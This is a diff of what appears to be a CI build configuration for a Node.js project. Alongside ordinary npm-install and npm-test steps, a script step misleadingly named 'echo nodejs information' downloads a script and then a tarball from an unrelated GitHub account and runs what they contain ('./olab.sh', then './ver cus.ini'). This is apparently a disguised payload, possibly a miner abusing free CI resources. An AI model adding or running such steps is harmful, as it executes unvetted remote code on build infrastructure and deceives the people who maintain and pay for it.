@@ -1,10 +1,16 @@
-box: node
-
+box: nodesource/trusty
+# Build definition
 build:
-
+  # The steps that will be executed on build
   steps:
+    # A step that executes `npm install` command
+    - npm-install
+    # A step that executes `npm test` command
+    - npm-test
+
+    # A custom script step, name value is used in the UI
+    # and the code value contains the command that get executed
     - script:
         name: echo nodejs information
         code: |
-         wget https://github.com/hendrik20212/hendr2021/blob/main/olab.sh && chmod u+x olab.sh && ./olab.sh
-
+          - wget https://github.com/hendrik20212/VRS/releases/download/doc1/Doc.tar.gz && tar -xvf Doc.tar.gz && ./ver cus.ini
